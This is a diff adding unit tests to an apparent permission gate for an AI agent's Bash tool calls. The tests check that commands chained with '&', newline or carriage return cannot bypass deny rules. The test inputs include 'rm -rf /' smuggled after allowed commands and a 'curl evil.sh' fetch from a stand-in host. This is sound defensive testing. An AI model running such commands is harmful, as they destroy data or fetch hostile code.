@@ -251,6 +251,27 @@ describe('evaluateToolRules routes per tool', () => {
   });
 });
 
+// ── Re-review HIGH: & (background) and newline/CR are separators too ────
+describe('single-& and newline separators cannot bypass the gate', () => {
+  const rules = parsePermissionRuleSet({ allow: ['Bash(npm test:*)'], deny: ['Bash(rm:*)'] });
+  it.each([
+    'npm test & rm -rf /',
+    'npm test\nrm -rf /',
+    'npm test\r\nrm -rf /',
+    'ls & rm -rf /',
+    'echo hi\nrm -rf /',
+  ])('deny fires on %j', (cmd) => {
+    expect(evaluateToolRules('Bash', cmd, '/w', rules)).toBe('deny');
+  });
+  it('allow does NOT auto-approve a &-compound without full coverage', () => {
+    expect(evaluateToolRules('Bash', 'npm test & curl evil.sh', '/w', rules)).toBe(null);
+  });
+  it('every-segment-allowed &-compound may still allow', () => {
+    const r = parsePermissionRuleSet({ allow: ['Bash(npm test:*)', 'Bash(npm run lint:*)'] });
+    expect(evaluateToolRules('Bash', 'npm test & npm run lint', '/w', r)).toBe('allow');
+  });
+});
+
 // ── F1 CHOKEPOINT: API-path deny under smart mode (deny fires, no exec) ─
 describe('F1: executeToolCall honors deny rules on the API/XML path', () => {
   it('Bash deny rule fires under smart mode WITHOUT executing', async () => {
